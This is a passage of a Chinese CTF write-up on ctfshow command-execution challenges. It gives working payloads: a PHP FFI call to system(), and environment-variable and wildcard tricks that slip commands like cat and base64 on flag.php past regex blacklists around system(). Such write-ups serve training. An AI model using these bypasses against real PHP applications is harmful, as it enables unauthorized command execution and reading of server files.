<span class="keyword">echo</span> <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();<span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>采用mysql里面的</p>
<h3 id="LOAD-FILE-函数"><a href="#LOAD-FILE-函数" class="headerlink" title="LOAD_FILE()函数"></a>LOAD_FILE()函数</h3><p><strong>文件读取</strong>：<code>LOAD_FILE()</code> 函数允许数据库用户读取服务器上的任意文件</p>
<h1 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h1><p>正常使用伪协议看目录</p>
<p>然后发现各种做法都不能做，果断看wp:</p>
<p>c&#x3D;$ffi &#x3D; FFI::cdef(“int system(const char *command);”);$a&#x3D;’&#x2F;readflag &gt; 1.txt’;$ffi-&gt;system($a);exit();</p>
<p>解释一下:</p>
<p>$ffi &#x3D; FFI::cdef(“int system(const char *command);”);  &#x2F;&#x2F;创建一个system对象</p>
<p>$a&#x3D;’&#x2F;readflag &gt; 1.txt’;  &#x2F;&#x2F;因为页面不会回显，所以将内容输出到1.txt</p>
<p>$ffi-&gt;system($a);  &#x2F;&#x2F;通过$ffi去调用system函数 </p>
<p>讲一下FFI</p>
<h3 id="FFI原理"><a href="#FFI原理" class="headerlink" title="FFI原理"></a>FFI原理</h3><p>FFI，php7.4 以上才有。</p>
<p><strong>FFI</strong>（Foreign Function Interface），即外部函数接口，是指在一种语言里调用另一种语言代码的技术。PHP 的 FFI 扩展就是一个让你在 PHP 里调用 C 代码的技术。</p>
<h1 id="web118"><a href="#web118" class="headerlink" title="web118"></a>web118</h1><h2 id="内置变量绕过"><a href="#内置变量绕过" class="headerlink" title="#内置变量绕过"></a>#内置变量绕过</h2><p>提示flag在flag.php中</p>
<p><img src="/../image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20250317154006777.png" alt="image-20250317154006777"></p>
<p>在源码里面有一段注释掉的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- system($code);--&gt;</span><br></pre></td></tr></table></figure>

<p>应该就是传参给code了</p>
<p>测试了一下发现数字字母都禁用了，试一下无数字字母rce，然后测出来自增和异或都用不了，一开始想做取反的但是括号也禁用了，这时候又是一个新姿势就是用系统环境变量进行绕过，详细的我写在RCE的文章里了，这里就直接给payload了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;PATH:~A&#125;$&#123;PWD:~A&#125; ????.???</span><br></pre></td></tr></table></figure>

<p>通过环境变量构造出字符nl，任何字母取反后都是数字0，然后用?号去匹配文件名flag.php</p>
<h1 id="web119"><a href="#web119" class="headerlink" title="web119"></a>web119</h1><p>一样的界面，不过PATH被过滤了，试试别的环境变量</p>
<p>这里放一位师傅的构造字符的姿势</p>
<p><img src="/../image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20250317164620779.png" alt="image-20250317164620779"></p>
<p>然后我们可以通过bash运行cat命令，那我们的payload就是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">方法一：</span><br><span class="line">/???/?a? ????.???</span><br><span class="line">payload：</span><br><span class="line">$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?$&#123;USER:~A&#125;? ????.???</span><br><span class="line">一开始这个payload打不出来估计是匹配不到，后面把t置换一下才可以</span><br><span class="line">$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?$&#123;USER:~A&#125;$&#123;HOME:$&#123;#HOSTNAME&#125;:$&#123;#SHLVL&#125;&#125; ????.???</span><br><span class="line">方法二：</span><br><span class="line">/???/??t ????.???</span><br><span class="line">payload</span><br><span class="line">$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;??$&#123;HOME:$&#123;#HOSTNAME&#125;:$&#123;#SHLVL&#125;&#125; ????.???</span><br><span class="line">方法三：</span><br><span class="line">构造/bin/base64 flag.php</span><br><span class="line">/???/?????4 ????.???</span><br><span class="line">$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?????$&#123;#RANDOM&#125; ????.???</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20250317165809692.png" alt="image-20250317165809692"></p>
<p>不过我${USER:~A}的结果是t，可能当前用户是www-data吧结果输出出来就是a，但是一开始只匹配?a?不太行，最后直接构造&#x2F;???&#x2F;?at去精准匹配了</p>
<p>后续：哦原来第一个payload是可以打出来的不过我没注意看有flag</p>
<h1 id="web120"><a href="#web120" class="headerlink" title="web120"></a>web120</h1><p>这次是给出源码了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;</span>, <span class="variable">$code</span>))&#123;    </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">65</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="string">&#x27;you are so long , I dont like &#x27;</span>.<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="title function_ invoke__">system</span>(<span class="variable">$code</span>).<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>HOME也被禁用了，长度也限制了但是第一个payload可以打，直接用就行</p>
<p><img src="/../image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20250317184857147.png" alt="image-20250317184857147"></p>
<h1 id="web121"><a href="#web121" class="headerlink" title="web121"></a>web121</h1><p>这次过滤了所有的环境变量</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;</span>, <span class="variable">$code</span>))&#123;    </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">65</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="string">&#x27;you are so long , I dont like &#x27;</span>.<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="title function_ invoke__">system</span>(<span class="variable">$code</span>).<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>先输出可用字符</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># $ . : ; ? @ A B C D E F G H I J K L M N O P Q R S T U V W X Y Z &#123; &#125; </span><br></pre></td></tr></table></figure>

<p>虽然过滤了SHLVL，但是可用用其他的表示1，那就可以用上面的base64的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">构造/bin/base64 flag.php</span><br><span class="line">/???/?????4 ????.???</span><br><span class="line">$&#123;PWD::$&#123;##&#125;&#125;???$&#123;PWD::$&#123;##&#125;&#125;?????$&#123;#RANDOM&#125; ????.???</span><br></pre></td></tr></table></figure>

<p>根据上面的图片去替换就可以，再次感谢那位师傅的图</p>
<p><img src="/../image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20250317190451957-1742209493627-7.png" alt="image-20250317190451957"></p>
<p>不过RANDOM是随机出现整数，范围为0-32767。然后加上#号表示的是这个变量的值的长度，例如<code>$&#123;#1234&#125;</code>的结果就是4</p>
<h1 id="web122"><a href="#web122" class="headerlink" title="web122"></a>web122</h1><p>这次连PWD和#都过滤了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|#|%|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;</span>, <span class="variable">$code</span>))&#123;    </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">65</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="string">&#x27;you are so long , I dont like &#x27;</span>.<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="title function_ invoke__">system</span>(<span class="variable">$code</span>).<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p> 还是需要构造的</p>
<p>看了其他的环境变量发现HOME还没被过滤，用来返回当前用户的主目录路径。不管怎么样第一个都是<code>/</code>，那就可以拿第三个payload去打</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/???/???4 ????.???</span><br></pre></td></tr></table></figure>

<p>然后我们只需要解决一个如何构造数字的问题。我们需要数字<code>1</code>和<code>4</code>。</p>
<p>我们可以利用<code>$?</code>，获取上一条命令执行结束后的返回值，<code>0</code>代表成功，<code>非0</code>代表失败。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@dkhkv28T7ijUp1amAVjh:/# echo $&#123;HOME:~~A&#125;</span><br><span class="line">/root</span><br><span class="line">root@dkhkv28T7ijUp1amAVjh:/# echo $?</span><br><span class="line">0</span><br><span class="line">root@dkhkv28T7ijUp1amAVjh:/# lss</span><br><span class="line">Command &#x27;lss&#x27; not found, but there are 15 similar ones.</span><br><span class="line">root@dkhkv28T7ijUp1amAVjh:/# echo $?</span><br><span class="line">127</span><br></pre></td></tr></table></figure>

<p>但是这里并不是1，该怎么做呢</p>
<p>错误代码的非0返回值如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line">&quot;OS error code   1:  Operation not permitted&quot;</span><br><span class="line">&quot;OS error code   2:  No such file or directory&quot;</span><br><span class="line">&quot;OS error code   3:  No such process&quot;</span><br><span class="line">&quot;OS error code   4:  Interrupted system call&quot;</span><br><span class="line">&quot;OS error code   5:  Input/output error&quot;</span><br><span class="line">&quot;OS error code   6:  No such device or address&quot;</span><br><span class="line">&quot;OS error code   7:  Argument list too long&quot;</span><br><span class="line">&quot;OS error code   8:  Exec format error&quot;</span><br><span class="line">&quot;OS error code   9:  Bad file descriptor&quot;</span><br><span class="line">&quot;OS error code  10:  No child processes&quot;</span><br><span class="line">&quot;OS error code  11:  Resource temporarily unavailable&quot;</span><br><span class="line">&quot;OS error code  12:  Cannot allocate memory&quot;</span><br><span class="line">&quot;OS error code  13:  Permission denied&quot;</span><br><span class="line">&quot;OS error code  14:  Bad address&quot;</span><br><span class="line">&quot;OS error code  15:  Block device required&quot;</span><br><span class="line">&quot;OS error code  16:  Device or resource busy&quot;</span><br><span class="line">&quot;OS error code  17:  File exists&quot;</span><br><span class="line">&quot;OS error code  18:  Invalid cross-device link&quot;</span><br><span class="line">&quot;OS error code  19:  No such device&quot;</span><br><span class="line">&quot;OS error code  20:  Not a directory&quot;</span><br><span class="line">&quot;OS error code  21:  Is a directory&quot;</span><br><span class="line">&quot;OS error code  22:  Invalid argument&quot;</span><br><span class="line">&quot;OS error code  23:  Too many open files in system&quot;</span><br><span class="line">&quot;OS error code  24:  Too many open files&quot;</span><br><span class="line">&quot;OS error code  25:  Inappropriate ioctl for device&quot;</span><br><span class="line">&quot;OS error code  26:  Text file busy&quot;</span><br><span class="line">&quot;OS error code  27:  File too large&quot;</span><br><span class="line">&quot;OS error code  28:  No space left on device&quot;</span><br><span class="line">&quot;OS error code  29:  Illegal seek&quot;</span><br><span class="line">&quot;OS error code  30:  Read-only file system&quot;</span><br><span class="line">&quot;OS error code  31:  Too many links&quot;</span><br><span class="line">&quot;OS error code  32:  Broken pipe&quot;</span><br><span class="line">&quot;OS error code  33:  Numerical argument out of domain&quot;</span><br><span class="line">&quot;OS error code  34:  Numerical result out of range&quot;</span><br><span class="line">&quot;OS error code  35:  Resource deadlock avoided&quot;</span><br><span class="line">&quot;OS error code  36:  File name too long&quot;</span><br><span class="line">&quot;OS error code  37:  No locks available&quot;</span><br><span class="line">&quot;OS error code  38:  Function not implemented&quot;</span><br><span class="line">&quot;OS error code  39:  Directory not empty&quot;</span><br><span class="line">&quot;OS error code  40:  Too many levels of symbolic links&quot;</span><br><span class="line">&quot;OS error code  42:  No message of desired type&quot;</span><br><span class="line">&quot;OS error code  43:  Identifier removed&quot;</span><br><span class="line">&quot;OS error code  44:  Channel number out of range&quot;</span><br><span class="line">&quot;OS error code  45:  Level 2 not synchronized&quot;</span><br><span class="line">&quot;OS error code  46:  Level 3 halted&quot;</span><br><span class="line">&quot;OS error code  47:  Level 3 reset&quot;</span><br><span class="line">&quot;OS error code  48:  Link number out of range&quot;</span><br><span class="line">&quot;OS error code  49:  Protocol driver not attached&quot;</span><br><span class="line">&quot;OS error code  50:  No CSI structure available&quot;</span><br><span class="line">&quot;OS error code  51:  Level 2 halted&quot;</span><br><span class="line">&quot;OS error code  52:  Invalid exchange&quot;</span><br><span class="line">&quot;OS error code  53:  Invalid request descriptor&quot;</span><br><span class="line">&quot;OS error code  54:  Exchange full&quot;</span><br><span class="line">&quot;OS error code  55:  No anode&quot;</span><br><span class="line">&quot;OS error code  56:  Invalid request code&quot;</span><br><span class="line">&quot;OS error code  57:  Invalid slot&quot;</span><br><span class="line">&quot;OS error code  59:  Bad font file format&quot;</span><br><span class="line">&quot;OS error code  60:  Device not a stream&quot;</span><br><span class="line">&quot;OS error code  61:  No data available&quot;</span><br><span class="line">&quot;OS error code  62:  Timer expired&quot;</span><br><span class="line">&quot;OS error code  63:  Out of streams resources&quot;</span><br><span class="line">&quot;OS error code  64:  Machine is not on the network&quot;</span><br><span class="line">&quot;OS error code  65:  Package not installed&quot;</span><br><span class="line">&quot;OS error code  66:  Object is remote&quot;</span><br><span class="line">&quot;OS error code  67:  Link has been severed&quot;</span><br><span class="line">&quot;OS error code  68:  Advertise error&quot;</span><br><span class="line">&quot;OS error code  69:  Srmount error&quot;</span><br><span class="line">&quot;OS error code  70:  Communication error on send&quot;</span><br><span class="line">&quot;OS error code  71:  Protocol error&quot;</span><br><span class="line">&quot;OS error code  72:  Multihop attempted&quot;</span><br><span class="line">&quot;OS error code  73:  RFS specific error&quot;</span><br><span class="line">&quot;OS error code  74:  Bad message&quot;</span><br><span class="line">&quot;OS error code  75:  Value too large for defined data type&quot;</span><br><span class="line">&quot;OS error code  76:  Name not unique on network&quot;</span><br><span class="line">&quot;OS error code  77:  File descriptor in bad state&quot;</span><br><span class="line">&quot;OS error code  78:  Remote address changed&quot;</span><br><span class="line">&quot;OS error code  79:  Can not access a needed shared library&quot;</span><br><span class="line">&quot;OS error code  80:  Accessing a corrupted shared library&quot;</span><br><span class="line">&quot;OS error code  81:  .lib section in a.out corrupted&quot;</span><br><span class="line">&quot;OS error code  82:  Attempting to link in too many shared libraries&quot;</span><br><span class="line">&quot;OS error code  83:  Cannot exec a shared library directly&quot;</span><br><span class="line">&quot;OS error code  84:  Invalid or incomplete multibyte or wide character&quot;</span><br><span class="line">&quot;OS error code  85:  Interrupted system call should be restarted&quot;</span><br><span class="line">&quot;OS error code  86:  Streams pipe error&quot;</span><br><span class="line">&quot;OS error code  87:  Too many users&quot;</span><br><span class="line">&quot;OS error code  88:  Socket operation on non-socket&quot;</span><br><span class="line">&quot;OS error code  89:  Destination address required&quot;</span><br><span class="line">&quot;OS error code  90:  Message too long&quot;</span><br><span class="line">&quot;OS error code  91:  Protocol wrong type for socket&quot;</span><br><span class="line">&quot;OS error code  92:  Protocol not available&quot;</span><br><span class="line">&quot;OS error code  93:  Protocol not supported&quot;</span><br><span class="line">&quot;OS error code  94:  Socket type not supported&quot;</span><br><span class="line">&quot;OS error code  95:  Operation not supported&quot;</span><br><span class="line">&quot;OS error code  96:  Protocol family not supported&quot;</span><br><span class="line">&quot;OS error code  97:  Address family not supported by protocol&quot;</span><br><span class="line">&quot;OS error code  98:  Address already in use&quot;</span><br><span class="line">&quot;OS error code  99:  Cannot assign requested address&quot;</span><br><span class="line">&quot;OS error code 100:  Network is down&quot;</span><br><span class="line">&quot;OS error code 101:  Network is unreachable&quot;</span><br><span class="line">&quot;OS error code 102:  Network dropped connection on reset&quot;</span><br><span class="line">&quot;OS error code 103:  Software caused connection abort&quot;</span><br><span class="line">&quot;OS error code 104:  Connection reset by peer&quot;</span><br><span class="line">&quot;OS error code 105:  No buffer space available&quot;</span><br><span class="line">&quot;OS error code 106:  Transport endpoint is already connected&quot;</span><br><span class="line">&quot;OS error code 107:  Transport endpoint is not connected&quot;</span><br><span class="line">&quot;OS error code 108:  Cannot send after transport endpoint shutdown&quot;</span><br><span class="line">&quot;OS error code 109:  Too many references: cannot splice&quot;</span><br><span class="line">&quot;OS error code 110:  Connection timed out&quot;</span><br><span class="line">&quot;OS error code 111:  Connection refused&quot;</span><br><span class="line">&quot;OS error code 112:  Host is down&quot;</span><br><span class="line">&quot;OS error code 113:  No route to host&quot;</span><br><span class="line">&quot;OS error code 114:  Operation already in progress&quot;</span><br><span class="line">&quot;OS error code 115:  Operation now in progress&quot;</span><br><span class="line">&quot;OS error code 116:  Stale NFS file handle&quot;</span><br><span class="line">&quot;OS error code 117:  Structure needs cleaning&quot;</span><br><span class="line">&quot;OS error code 118:  Not a XENIX named type file&quot;</span><br><span class="line">&quot;OS error code 119:  No XENIX semaphores available&quot;</span><br><span class="line">&quot;OS error code 120:  Is a named type file&quot;</span><br><span class="line">&quot;OS error code 121:  Remote I/O error&quot;</span><br><span class="line">&quot;OS error code 122:  Disk quota exceeded&quot;</span><br><span class="line">&quot;OS error code 123:  No medium found&quot;</span><br><span class="line">&quot;OS error code 124:  Wrong medium type&quot;</span><br><span class="line">&quot;OS error code 125:  Operation canceled&quot;</span><br><span class="line">&quot;OS error code 126:  Required key not available&quot;</span><br><span class="line">&quot;OS error code 127:  Key has expired&quot;</span><br><span class="line">&quot;OS error code 128:  Key has been revoked&quot;</span><br><span class="line">&quot;OS error code 129:  Key was rejected by service&quot;</span><br><span class="line">&quot;OS error code 130:  Owner died&quot;</span><br><span class="line">&quot;OS error code 131:  State not recoverable&quot;</span><br><span class="line">&quot;MySQL error code 132: Old database file&quot;</span><br><span class="line">&quot;MySQL error code 133: No record read before update&quot;</span><br><span class="line">&quot;MySQL error code 134: Record was already deleted (or record file crashed)&quot;</span><br><span class="line">&quot;MySQL error code 135: No more room in record file&quot;</span><br><span class="line">&quot;MySQL error code 136: No more room in index file&quot;</span><br><span class="line">&quot;MySQL error code 137: No more records (read after end of file)&quot;</span><br><span class="line">&quot;MySQL error code 138: Unsupported extension used for table&quot;</span><br><span class="line">&quot;MySQL error code 139: Too big row&quot;</span><br><span class="line">&quot;MySQL error code 140: Wrong create options&quot;</span><br><span class="line">&quot;MySQL error code 141: Duplicate unique key or constraint on write or update&quot;</span><br><span class="line">&quot;MySQL error code 142: Unknown character set used&quot;</span><br><span class="line">&quot;MySQL error code 143: Conflicting table definitions in sub-tables of MERGE table&quot;</span><br><span class="line">&quot;MySQL error code 144: Table is crashed and last repair failed&quot;</span><br><span class="line">&quot;MySQL error code 145: Table was marked as crashed and should be repaired&quot;</span><br><span class="line">&quot;MySQL error code 146: Lock timed out; Retry transaction&quot;</span><br><span class="line">&quot;MySQL error code 147: Lock table is full;  Restart program with a larger locktable&quot;</span><br><span class="line">&quot;MySQL error code 148: Updates are not allowed under a read only transactions&quot;</span><br><span class="line">&quot;MySQL error code 149: Lock 